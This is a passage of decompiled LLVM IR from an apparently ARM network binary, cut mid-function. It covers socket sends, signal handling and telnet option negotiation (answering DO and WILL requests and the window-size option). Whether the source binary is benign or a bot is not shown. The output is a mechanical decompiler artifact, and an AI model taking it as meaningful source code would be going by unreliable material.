  %v2_fde4 = icmp ne i32 %v0_fde4, 0
  store i1 %v2_fde4, i1* %cpsr_c.global-to-local, align 1
  %v7_fde4 = icmp eq i32 %v0_fde4, 1
  store i1 %v7_fde4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fde4, label %dec_label_pc_fdec, label %dec_label_pc_fdb8

dec_label_pc_fdec:                                ; preds = %dec_label_pc_fde4, %dec_label_pc_fd70
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_fdf0 = call i32 @function_1030c(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_fdf8 = call i32 @function_1030c(i32 27)
  store i32 %v2_fe00, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_fe08 = call i32 @function_10248(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_fe08, i32* @r4, align 4
  store i32 %v2_fe00, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_fe1c = call i32 @function_10248(i32 27, i32* nonnull %stack_var_-60)
  %v3_fe20 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fe1c, i32* @r5, align 4
  %v0_fe28 = load i32, i32* @r4, align 4
  store i32 %v0_fe28, i32* %r2.global-to-local, align 4
  %v1_fe2c = add i32 %v3_fe20, -1
  store i32 %v1_fe2c, i32* %r3.global-to-local, align 4
  %v0_fe30 = load i32, i32* @fp, align 4
  store i32 %v0_fe30, i32* %r0.global-to-local, align 4
  %v0_fe34 = load i32, i32* @r6, align 4
  %v1_fe34 = add i32 %v0_fe34, 24
  %v2_fe34 = inttoptr i32 %v1_fe34 to i32*
  %v3_fe34 = load i32, i32* %v2_fe34, align 4
  store i32 %v3_fe34, i32* %r1.global-to-local, align 4
  %v4_fe38 = call i32 @function_10904(i32 %v0_fe30, i32 %v3_fe34, i32 %v0_fe28, i32 %v1_fe2c)
  store i32 %v4_fe38, i32* %r0.global-to-local, align 4
  %v2_fe3c = icmp eq i32 %v4_fe38, -1
  store i1 %v2_fe3c, i1* %cpsr_c.global-to-local, align 1
  %v7_fe3c = icmp eq i32 %v4_fe38, -1
  store i1 %v7_fe3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe3c, label %dec_label_pc_fe4c, label %dec_label_pc_fe74

dec_label_pc_fe4c:                                ; preds = %dec_label_pc_fdec
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_fe4c = load i32, i32* %stack_var_-60, align 4
  %v0_fe50 = load i32, i32* @r5, align 4
  store i32 %v0_fe50, i32* %r2.global-to-local, align 4
  %v1_fe54 = add i32 %v3_fe4c, -1
  store i32 %v1_fe54, i32* %r3.global-to-local, align 4
  %v0_fe58 = load i32, i32* @fp, align 4
  store i32 %v0_fe58, i32* %r0.global-to-local, align 4
  %v0_fe5c = load i32, i32* @r6, align 4
  %v1_fe5c = add i32 %v0_fe5c, 24
  %v2_fe5c = inttoptr i32 %v1_fe5c to i32*
  %v3_fe5c = load i32, i32* %v2_fe5c, align 4
  store i32 %v3_fe5c, i32* %r1.global-to-local, align 4
  %v4_fe60 = call i32 @function_10904(i32 %v0_fe58, i32 %v3_fe5c, i32 %v0_fe50, i32 %v1_fe54)
  store i32 %v4_fe60, i32* %r0.global-to-local, align 4
  %v2_fe64 = icmp eq i32 %v4_fe60, -1
  store i1 %v2_fe64, i1* %cpsr_c.global-to-local, align 1
  %v7_fe64 = icmp eq i32 %v4_fe60, -1
  store i1 %v7_fe64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe64, label %dec_label_pc_1020c, label %dec_label_pc_fe74

dec_label_pc_fe74:                                ; preds = %dec_label_pc_fe4c, %dec_label_pc_fdec
  store i32 1, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_fe78 = call i32 @function_1026c(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_fe80 = call i32 @function_1026c(i32 27)
  store i32 %v1_fe80, i32* %r0.global-to-local, align 4
  %v0_fe84 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fe84 = icmp eq i32 %v0_fe84, 0
  store i1 %v2_fe84, i1* %cpsr_z.global-to-local, align 1
  %tmp458 = icmp slt i32 %v0_fe84, 1
  br i1 %tmp458, label %dec_label_pc_f6e4, label %dec_label_pc_ff18

dec_label_pc_fe90:                                ; preds = %dec_label_pc_f82c
  store i32 %v2_fe94, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_16748.192 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_fe94, i32* @r0, align 4
  %v0_feac = call i32 @function_11840()
  store i32 9, i32* @r2, align 4
  store i32 %v2_fea8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1673f.194 to i32), i32* @r1, align 4
  %v0_febc = call i32 @function_11840()
  store i32 %v0_febc, i32* %r0.global-to-local, align 4
  %v0_fec0 = load i32, i32* @r6, align 4
  %v1_fec0 = add i32 %v0_fec0, 24
  %v2_fec0 = inttoptr i32 %v1_fec0 to i32*
  %v3_fec0 = load i32, i32* %v2_fec0, align 4
  %v0_fec4 = load i32, i32* @r4, align 4
  %v1_fec4 = add i32 %v0_fec4, 2
  store i32 %v1_fec4, i32* %r2.global-to-local, align 4
  %v0_fec8 = load i32, i32* @fp, align 4
  %v2_fec8 = add i32 %v0_fec8, %v3_fec0
  store i32 %v2_fec8, i32* @r3, align 4
  %v3_fecc = icmp uge i32 %v2_fec8, %v1_fec4
  store i1 %v3_fecc, i1* %cpsr_c.global-to-local, align 1
  %v9_fecc = icmp eq i32 %v2_fec8, %v1_fec4
  store i1 %v9_fecc, i1* %cpsr_z.global-to-local, align 1
  %v2_fed0 = xor i1 %v3_fecc, true
  %v3_fed0 = or i1 %v9_fecc, %v2_fed0
  br i1 %v3_fed0, label %dec_label_pc_fe90.dec_label_pc_f8a8.loopexit_crit_edge, label %dec_label_pc_fed4

dec_label_pc_fe90.dec_label_pc_f8a8.loopexit_crit_edge: ; preds = %dec_label_pc_fe90
  %v0_f8a8.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f8a8

dec_label_pc_fed4:                                ; preds = %dec_label_pc_fe90
  %v2_fed4 = inttoptr i32 %v1_fec4 to i8*
  %v3_fed4 = load i8, i8* %v2_fed4, align 1
  %v4_fed4 = zext i8 %v3_fed4 to i32
  store i32 %v4_fed4, i32* %r3.global-to-local, align 4
  %v2_fed8 = icmp ugt i8 %v3_fed4, 30
  store i1 %v2_fed8, i1* %cpsr_c.global-to-local, align 1
  %v7_fed8 = icmp eq i8 %v3_fed4, 31
  store i1 %v7_fed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fed8, label %dec_label_pc_ffa4, label %dec_label_pc_fee0

dec_label_pc_fee0:                                ; preds = %dec_label_pc_fed4
  %v1_fee0 = inttoptr i32 %v0_fec4 to i8*
  %v2_fee0 = load i8, i8* %v1_fee0, align 1
  %v3_fee0 = zext i8 %v2_fee0 to i32
  store i32 %v3_fee0, i32* %r3.global-to-local, align 4
  %v2_fee4 = icmp ugt i8 %v2_fee0, -4
  store i1 %v2_fee4, i1* %cpsr_c.global-to-local, align 1
  %v7_fee4 = icmp eq i8 %v2_fee0, -3
  store i1 %v7_fee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fee4, label %.thread145, label %dec_label_pc_fef4

.thread145:                                       ; preds = %dec_label_pc_fee0
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_fee0, align 1
  %v0_fef0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fef0.pr.pr, label %dec_label_pc_f840, label %.thread145.dec_label_pc_fef4thread-pre-split_crit_edge

.thread145.dec_label_pc_fef4thread-pre-split_crit_edge: ; preds = %.thread145
  %v0_fef4.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fef4

dec_label_pc_fef4:                                ; preds = %dec_label_pc_fee0, %.thread145.dec_label_pc_fef4thread-pre-split_crit_edge
  %v0_fef4.pr = phi i32 [ %v0_fef4.pr.pre, %.thread145.dec_label_pc_fef4thread-pre-split_crit_edge ], [ %v3_fee0, %dec_label_pc_fee0 ]
  %v2_fef4 = icmp ugt i32 %v0_fef4.pr, 250
  store i1 %v2_fef4, i1* %cpsr_c.global-to-local, align 1
  %v7_fef4 = icmp eq i32 %v0_fef4.pr, 251
  store i1 %v7_fef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fef4, label %bb459, label %dec_label_pc_f840

bb459:                                            ; preds = %dec_label_pc_fef4
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_fefc = load i32, i32* @r4, align 4
  %v4_fefc = inttoptr i32 %v3_fefc to i8*
  store i8 -3, i8* %v4_fefc, align 1
  br label %dec_label_pc_f840

dec_label_pc_ff04:                                ; preds = %dec_label_pc_fdb8, %dec_label_pc_fdd8, %dec_label_pc_fdd0, %dec_label_pc_fdc8, %bb457, %dec_label_pc_fda4, %dec_label_pc_fd80, %dec_label_pc_fd9c, %dec_label_pc_fd94, %bb456
  %v0_ff08 = phi i32 [ %v1_fd74, %dec_label_pc_fda4 ], [ %v1_fd74, %dec_label_pc_fd80 ], [ %v1_fd74, %dec_label_pc_fd9c ], [ %v1_fd74, %dec_label_pc_fd94 ], [ %v1_fd74, %bb456 ], [ %v1_fde4, %bb457 ], [ %v1_fde4, %dec_label_pc_fdc8 ], [ %v1_fde4, %dec_label_pc_fdd0 ], [ %v1_fde4, %dec_label_pc_fdd8 ], [ %v1_fde4, %dec_label_pc_fdb8 ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_ff08 = add i32 %v0_ff08, 1
  store i32 %v1_ff08, i32* @r8, align 4
  %v1_ff0c = call i32 @function_1026c(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_ff14 = call i32 @function_1026c(i32 27)
  store i32 %v1_ff14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ff18

dec_label_pc_ff18:                                ; preds = %dec_label_pc_fe74, %dec_label_pc_ff04
  %v0_ff18 = load i32, i32* @r6, align 4
  %v1_ff18 = inttoptr i32 %v0_ff18 to i32*
  %v2_ff18 = load i32, i32* %v1_ff18, align 4
  store i32 %v2_ff18, i32* %r3.global-to-local, align 4
  %v1_ff1c = add i32 %v0_ff18, 4
  %v2_ff1c = inttoptr i32 %v1_ff1c to i32*
  %v3_ff1c = load i32, i32* %v2_ff1c, align 4
  store i32 %v3_ff1c, i32* %r0.global-to-local, align 4
  %v1_ff20 = add i32 %v2_ff18, 12
  %v2_ff20 = inttoptr i32 %v1_ff20 to i8*
  %v3_ff20 = load i8, i8* %v2_ff20, align 1
  %v4_ff20 = zext i8 %v3_ff20 to i32
  store i32 %v4_ff20, i32* %r2.global-to-local, align 4
  %v1_ff24 = inttoptr i32 %v2_ff18 to i32*
  %v2_ff24 = load i32, i32* %v1_ff24, align 4
  store i32 %v2_ff24, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ff2c = call i32 @function_11a30(i32 %v3_ff1c, i32 %v2_ff24, i32 %v4_ff20, i32 16384)
  store i32 %v4_ff2c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ff34 = load i32, i32* @r6, align 4
  %v1_ff34 = add i32 %v0_ff34, 4
  %v2_ff34 = inttoptr i32 %v1_ff34 to i32*
  %v3_ff34 = load i32, i32* %v2_ff34, align 4
  store i32 %v3_ff34, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_ff40 = call i32 @function_11a30(i32 %v3_ff34, i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32 2, i32 16384)
  store i32 %v4_ff40, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_ff48 = load i32, i32* @r6, align 4
  %v2_ff48 = add i32 %v1_ff48, 12
  %v3_ff48 = inttoptr i32 %v2_ff48 to i32*
  store i32 4, i32* %v3_ff48, align 4
  br label %dec_label_pc_f6e4

dec_label_pc_ff50:                                ; preds = %dec_label_pc_fbf0, %dec_label_pc_fc08, %dec_label_pc_fc00, %bb451, %dec_label_pc_fbdc, %dec_label_pc_fbc0, %dec_label_pc_fbd4, %bb450
  %v0_ff54 = phi i32 [ %v1_fbb4, %dec_label_pc_fbdc ], [ %v1_fbb4, %dec_label_pc_fbc0 ], [ %v1_fbb4, %dec_label_pc_fbd4 ], [ %v1_fbb4, %bb450 ], [ %v1_fc14, %bb451 ], [ %v1_fc14, %dec_label_pc_fc00 ], [ %v1_fc14, %dec_label_pc_fc08 ], [ %v1_fc14, %dec_label_pc_fbf0 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_ff54 = add i32 %v0_ff54, 1
  store i32 %v1_ff54, i32* @r8, align 4
  %v1_ff58 = call i32 @function_1026c(i32 25)
  br label %dec_label_pc_fc64

dec_label_pc_ff60:                                ; preds = %dec_label_pc_f5a0
  store i32 %v1_f5dc, i32* %r0.global-to-local, align 4
  %v0_ff68 = load i32, i32* @r6, align 4
  %v1_ff68 = add i32 %v0_ff68, 4
  %v2_ff68 = inttoptr i32 %v1_ff68 to i32*
  %v3_ff68 = load i32, i32* %v2_ff68, align 4
  store i32 %v3_ff68, i32* %r0.global-to-local, align 4
  %v1_ff6c = call i32 @function_1130c(i32 %v3_ff68)
  store i32 %v1_ff6c, i32* %r0.global-to-local, align 4
  %v0_ff70 = load i32, i32* @r6, align 4
  %v1_ff70 = add i32 %v0_ff70, 284
  %v2_ff70 = inttoptr i32 %v1_ff70 to i8*
  %v3_ff70 = load i8, i8* %v2_ff70, align 1
  %v4_ff70 = zext i8 %v3_ff70 to i32
  %v1_ff74 = add nuw nsw i32 %v4_ff70, 1
  %v1_ff78 = urem i32 %v1_ff74, 256
  store i32 %v1_ff78, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ff80 = icmp ugt i32 %v1_ff78, 9
  store i1 %v2_ff80, i1* %cpsr_c.global-to-local, align 1
  %v7_ff80 = icmp eq i32 %v1_ff78, 10
  store i1 %v7_ff80, i1* %cpsr_z.global-to-local, align 1
  %v2_ff84 = add i32 %v0_ff70, 4
  %v3_ff84 = inttoptr i32 %v2_ff84 to i32*
  store i32 -1, i32* %v3_ff84, align 4
  %v0_ff88 = load i32, i32* @r3, align 4
  %v1_ff88 = trunc i32 %v0_ff88 to i8
  %v2_ff88 = load i32, i32* @r6, align 4
  %v3_ff88 = add i32 %v2_ff88, 284
  %v4_ff88 = inttoptr i32 %v3_ff88 to i8*
  store i8 %v1_ff88, i8* %v4_ff88, align 1
  %v0_ff8c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ff8c, label %dec_label_pc_ff90, label %dec_label_pc_ffec

dec_label_pc_ff90:                                ; preds = %dec_label_pc_ff60
  store i32 0, i32* @r3, align 4
  store i32 -1, i32* @r8, align 4
  %v1_ff98 = load i32, i32* @r6, align 4
  %v2_ff98 = add i32 %v1_ff98, 12
  %v3_ff98 = inttoptr i32 %v2_ff98 to i32*
  store i32 0, i32* %v3_ff98, align 4
  %v0_ff9c = load i32, i32* @r3, align 4
  %v1_ff9c = trunc i32 %v0_ff9c to i8
  %v2_ff9c = load i32, i32* @r6, align 4
  %v3_ff9c = add i32 %v2_ff9c, 284
  %v4_ff9c = inttoptr i32 %v3_ff9c to i8*
  store i8 %v1_ff9c, i8* %v4_ff9c, align 1
  br label %dec_label_pc_f6ec

dec_label_pc_ffa4:                                ; preds = %dec_label_pc_fed4
  store i32 %v2_fe94, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_ffb0 = add i32 %v0_fec0, 4
  %v2_ffb0 = inttoptr i32 %v1_ffb0 to i32*
  %v3_ffb0 = load i32, i32* %v2_ffb0, align 4
  store i32 %v3_ffb0, i32* %r0.global-to-local, align 4
  %v4_ffb4 = call i32 @function_11a30(i32 %v3_ffb0, i32 %v2_fe94, i32 3, i32 16384)
  store i32 %v4_ffb4, i32* %r0.global-to-local, align 4
  %v0_ffb8 = load i32, i32* @r6, align 4
  %v1_ffb8 = add i32 %v0_ffb8, 4
  %v2_ffb8 = inttoptr i32 %v1_ffb8 to i32*
  %v3_ffb8 = load i32, i32* %v2_ffb8, align 4
  store i32 %v3_ffb8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f88c

dec_label_pc_ffc8:                                ; preds = %dec_label_pc_f484
  store i32 %.pre, i32* @r0, align 4
  %v1_ffd0 = add i32 %v0_ffc8, 92
  store i32 %v1_ffd0, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_ffd8 = call i32 @function_11830(i32 %.pre, i32 %v1_ffd0, i32 192)
  store i32 %v3_ffd8, i32* %r0.global-to-local, align 4
  %v0_ffdc = load i32, i32* @r6, align 4
  %v1_ffdc = add i32 %v0_ffdc, 24
  %v2_ffdc = inttoptr i32 %v1_ffdc to i32*
  %v3_ffdc = load i32, i32* %v2_ffdc, align 4
  %v1_ffe0 = add i32 %v3_ffdc, -64
  store i32 %v1_ffe0, i32* %r3.global-to-local, align 4
  store i32 %v1_ffe0, i32* %v2_ffdc, align 4
  br label %dec_label_pc_f494

dec_label_pc_ffec:                                ; preds = %dec_label_pc_ff60
  %v0_ffec = load i32, i32* @r6, align 4
  store i32 %v0_ffec, i32* @r0, align 4
  %v0_fff0 = call i32 @function_e868()
  store i32 %v0_fff0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r8, align 4
  br label %dec_label_pc_f6ec

dec_label_pc_fffc:                                ; preds = %dec_label_pc_f43c
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_eba8, i32* %r3.global-to-local, align 4
  store i32 %v2_fe00, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v5_10024 = call i32 @function_11944(i32 %v3_f430, i32 1, i32 4, i32 %v2_eba8, i32 %v2_fe00)
  %v3_10028 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10028, i32* %r3.global-to-local, align 4
  %v2_1002c = or i32 %v3_10028, %v5_10024
  store i32 %v2_1002c, i32* %r0.global-to-local, align 4
  %v4_1002c = icmp eq i32 %v2_1002c, 0
  store i1 %v4_1002c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_1002c, label %dec_label_pc_10034, label %dec_label_pc_100c0

dec_label_pc_10034:                               ; preds = %dec_label_pc_fffc
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_10038 = load i32, i32* @r6, align 4
  %v2_10038 = add i32 %v1_10038, 12
  %v3_10038 = inttoptr i32 %v2_10038 to i32*
  store i32 2, i32* %v3_10038, align 4
  %v0_1003c = call i32 @function_e0d0()
  store i32 %v0_1003c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_1f2a0.128 to i32), i32* %r3.global-to-local, align 4
  %v2_10044 = load i16, i16* bitcast (i16** @global_var_1f2a0.128 to i16*), align 4
  %v3_10044 = zext i16 %v2_10044 to i32
  store i32 %v3_10044, i32* %r1.global-to-local, align 4
  %v3_10048 = call i32 @function_10ea4(i32 %v0_1003c, i32 %v3_10044)
  store i32 %v3_10048, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f270.124 to i32), i32* %r3.global-to-local, align 4
  %v2_10050 = load i32, i32* @global_var_1f270.124, align 4
  store i32 %v2_10050, i32* %ip.global-to-local, align 4
  %v1_10058 = load i32, i32* @r4, align 4
  %v9_10058 = icmp eq i32 %v2_10050, %v1_10058
  store i1 %v9_10058, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_10044, i32* %r1.global-to-local, align 4
  %v7_10060 = icmp sgt i32 %v2_10050, %v1_10058
  br i1 %v7_10060, label %dec_label_pc_10064, label %dec_label_pc_1009c

dec_label_pc_10064:                               ; preds = %dec_label_pc_10034
  %v2_10068 = load i32, i32* @global_var_1f29c.126, align 4
  store i32 %v2_10068, i32* %r3.global-to-local, align 4
  store i32 %v1_10058, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10070

dec_label_pc_10070:                               ; preds = %dec_label_pc_1008c, %dec_label_pc_10064
  %v0_1008c = phi i32 [ %v1_1008c, %dec_label_pc_1008c ], [ %v1_10058, %dec_label_pc_10064 ]
  %v0_10094 = phi i32 [ %v1_10094, %dec_label_pc_1008c ], [ %v2_10068, %dec_label_pc_10064 ]
  store i32 %v0_10094, i32* %r0.global-to-local, align 4
  %v1_10074 = add i32 %v0_10094, 8
  %v2_10074 = inttoptr i32 %v1_10074 to i16*
  %v3_10074 = load i16, i16* %v2_10074, align 2
  %v4_10074 = zext i16 %v3_10074 to i32
  store i32 %v4_10074, i32* %r3.global-to-local, align 4
  %tmp460 = icmp ugt i16 %v3_10074, %v2_10044
  br i1 %tmp460, label %dec_label_pc_1008c, label %dec_label_pc_10080

dec_label_pc_10080:                               ; preds = %dec_label_pc_10070
  %v1_10080 = add i32 %v0_10094, 10
  %v2_10080 = inttoptr i32 %v1_10080 to i16*
  %v3_10080 = load i16, i16* %v2_10080, align 2
  %v4_10080 = zext i16 %v3_10080 to i32
  store i32 %v4_10080, i32* %r3.global-to-local, align 4
  %v3_10084 = icmp uge i16 %v3_10080, %v2_10044
  %v9_10084 = icmp eq i16 %v3_10080, %v2_10044
  %v2_10088 = xor i1 %v9_10084, true
  %v3_10088 = and i1 %v3_10084, %v2_10088
  br i1 %v3_10088, label %dec_label_pc_100a0.loopexit, label %dec_label_pc_1008c

dec_label_pc_1008c:                               ; preds = %dec_label_pc_10080, %dec_label_pc_10070
  %v1_1008c = add i32 %v0_1008c, 1
  store i32 %v1_1008c, i32* %r2.global-to-local, align 4
  %v9_10090 = icmp eq i32 %v1_1008c, %v2_10050
  %v1_10094 = add i32 %v0_10094, 16
  store i32 %v1_10094, i32* %r3.global-to-local, align 4
  br i1 %v9_10090, label %dec_label_pc_1009c.loopexit, label %dec_label_pc_10070

dec_label_pc_1009c.loopexit:                      ; preds = %dec_label_pc_1008c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1009c

dec_label_pc_1009c:                               ; preds = %dec_label_pc_1009c.loopexit, %dec_label_pc_10034
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100a0

dec_label_pc_100a0.loopexit:                      ; preds = %dec_label_pc_10080
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v9_10084, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_100a0

dec_label_pc_100a0:                               ; preds = %dec_label_pc_100a0.loopexit, %dec_label_pc_1009c
  %v0_100b4 = phi i32 [ %v0_10094, %dec_label_pc_100a0.loopexit ], [ 0, %dec_label_pc_1009c ]
  %v0_100a0 = load i32, i32* @r6, align 4
  %v1_100a0 = add i32 %v0_100a0, 4
  %v2_100a0 = inttoptr i32 %v1_100a0 to i32*
  %v3_100a0 = load i32, i32* %v2_100a0, align 4
  %v3_100a4 = udiv i32 %v3_100a0, 32
  store i32 %v3_100a4, i32* %r2.global-to-local, align 4
  %v1_100a8 = urem i32 %v3_100a0, 32
  store i32 %v1_100a8, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_100ac = mul nuw nsw i32 %v3_100a4, 4
  store i32 %v3_100ac, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_100b4 = inttoptr i32 %v0_100a0 to i32*
  store i32 %v0_100b4, i32* %v2_100b4, align 4
  %v0_100b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100b8 = load i32, i32* @r6, align 4
  %v2_100b8 = add i32 %v1_100b8, 24
  %v3_100b8 = inttoptr i32 %v2_100b8 to i32*
  store i32 %v0_100b8, i32* %v3_100b8, align 4
  %v0_f464.pre = load i32, i32* @ip, align 4
  %v1_f46c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f460

dec_label_pc_100c0:                               ; preds = %dec_label_pc_fffc
  %v0_100c0 = load i32, i32* @r6, align 4
  %v1_100c0 = add i32 %v0_100c0, 4
  %v2_100c0 = inttoptr i32 %v1_100c0 to i32*
  %v3_100c0 = load i32, i32* %v2_100c0, align 4
  store i32 %v3_100c0, i32* %r0.global-to-local, align 4
  %v1_100c4 = call i32 @function_1130c(i32 %v3_100c0)
  store i32 %v1_100c4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_100cc = load i32, i32* @r4, align 4
  %v1_100cc = load i32, i32* @r6, align 4
  %v2_100cc = add i32 %v1_100cc, 12
  %v3_100cc = inttoptr i32 %v2_100cc to i32*
  store i32 %v0_100cc, i32* %v3_100cc, align 4
  %v0_100d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100d0 = load i32, i32* @r6, align 4
  %v2_100d0 = add i32 %v1_100d0, 4
  %v3_100d0 = inttoptr i32 %v2_100d0 to i32*
  store i32 %v0_100d0, i32* %v3_100d0, align 4
  %v0_100d4 = load i32, i32* @r4, align 4
  %v1_100d4 = trunc i32 %v0_100d4 to i8
  %v2_100d4 = load i32, i32* @r6, align 4
  %v3_100d4 = add i32 %v2_100d4, 284
  %v4_100d4 = inttoptr i32 %v3_100d4 to i8*
  store i8 %v1_100d4, i8* %v4_100d4, align 1
  br label %dec_label_pc_f588

dec_label_pc_100dc:                               ; preds = %dec_label_pc_f684
  store i32 2, i32* @lr, align 4
  store i32 %v2_f634, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v1_100e8 = add i32 %v2_f690, 4
  %v2_100e8 = inttoptr i32 %v1_100e8 to i32*
  %v3_100e8 = load i32, i32* %v2_100e8, align 4
  store i32 %v3_100e8, i32* @r4, align 4
  %v0_100ec = call i32 @function_e0d0()
  store i32 %v0_100ec, i32* %r0.global-to-local, align 4
  %v0_100f0 = load i32, i32* @r7, align 4
  %v1_100f0 = inttoptr i32 %v0_100f0 to i8*
  %v2_100f0 = load i8, i8* %v1_100f0, align 1
  %v3_100f0 = zext i8 %v2_100f0 to i32
  store i32 %v3_100f0, i32* %r1.global-to-local, align 4
  %v2_100f4 = call i32 @function_10ea4(i32 %v0_100ec, i32 %v3_100f0)
  store i32 %v2_100f4, i32* %r0.global-to-local, align 4
  %v0_100f8 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_100f8 = mul nuw nsw i32 %v3_100f0, 4
  %v5_100f8 = add i32 %v0_100f8, %v4_100f8
  %v6_100f8 = inttoptr i32 %v5_100f8 to i32*
  %v7_100f8 = load i32, i32* %v6_100f8, align 4
  store i32 %v7_100f8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10100 = load i32, i32* @sl, align 4
  store i32 %v0_10100, i32* %r1.global-to-local, align 4
  %v2_10108 = inttoptr i32 %v0_10100 to i32*
  %v3_10108 = call i32 @function_10248(i32 2, i32* %v2_10108)
  store i32 %v2_f634, i32* %r1.global-to-local, align 4
  %v0_10118 = load i32, i32* @r7, align 4
  store i32 %v0_10118, i32* %r0.global-to-local, align 4
  %v1_1011c = call i32 @function_e340(i32 %v0_10118)
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10124 = call i32 @function_1026c(i32 2)
  %v0_1012c = load i32, i32* @r5, align 4
  store i32 %v0_1012c, i32* %r0.global-to-local, align 4
  store i32 %v2_10130, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_10138 = call i32 @function_118d4(i32 %v0_1012c, i32 %v2_10130, i32 16)
  store i32 %v3_10138, i32* %r0.global-to-local, align 4
  %v3_1013c = icmp eq i32 %v3_10138, -1
  store i1 %v3_1013c, i1* %cpsr_c.global-to-local, align 1
  %v8_1013c = icmp eq i32 %v3_10138, -1
  store i1 %v8_1013c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1013c, label %dec_label_pc_10144, label %dec_label_pc_10154

dec_label_pc_10144:                               ; preds = %dec_label_pc_100dc
  %v0_10144 = load i32, i32* @r5, align 4
  store i32 %v0_10144, i32* %r0.global-to-local, align 4
  %v1_10148 = call i32 @function_1130c(i32 %v0_10144)
  %v0_1014c = load i32, i32* @sl, align 4
  store i32 %v0_1014c, i32* %r0.global-to-local, align 4
  %v1_10150 = call i32 @function_13340(i32 %v0_1014c)
  store i32 %v1_10150, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10154

dec_label_pc_10154:                               ; preds = %dec_label_pc_100dc, %dec_label_pc_10144
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_eba8, i32* %r1.global-to-local, align 4
  %v0_10160 = load i32, i32* @r5, align 4
  store i32 %v0_10160, i32* %r0.global-to-local, align 4
  %v0_10164 = load i32, i32* @sl, align 4
  store i32 %v0_10164, i32* %stack_var_-56, align 4
  %v5_10168 = call i32 @function_11a30(i32 %v0_10160, i32 %v2_eba8, i32 1, i32 16384)
  store i32 %v2_fe00, i32* %r1.global-to-local, align 4
